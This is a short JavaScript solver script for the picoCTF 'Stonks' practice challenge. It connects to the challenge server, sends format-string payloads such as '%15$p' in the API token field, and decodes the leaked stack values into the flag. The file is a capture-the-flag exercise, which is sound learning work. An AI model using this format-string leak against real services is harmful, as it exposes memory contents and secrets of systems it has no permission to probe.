/**
 * https://play.picoctf.org/practice/challenge/105 (Stonks)
 *
 * Solves by retrieving bytes of the flag via string formatting.
 */

const { Remote, convo } = require("..");

(async () => {
    let flag = '';
    for (let i = 15; i < 25; ++i) {
        const remote = Remote.create("mercury.picoctf.net", 20195);
        await remote.onceDataAsync('What would you like to do?\n')
        remote.send("1\n");

        await remote.onceDataAsync('What is your API token?\n');
        await remote.send(`%${i}$p\n`);

        await remote.onceDataAsync('Buying stonks with token:\n');

        const [hexStr] = await remote.onceLinesAsync(1);
        const int = parseInt(hexStr, 16);
        
        flag += convo.toString(int);

    }

    console.log(flag);
    process.exit(1);
})();
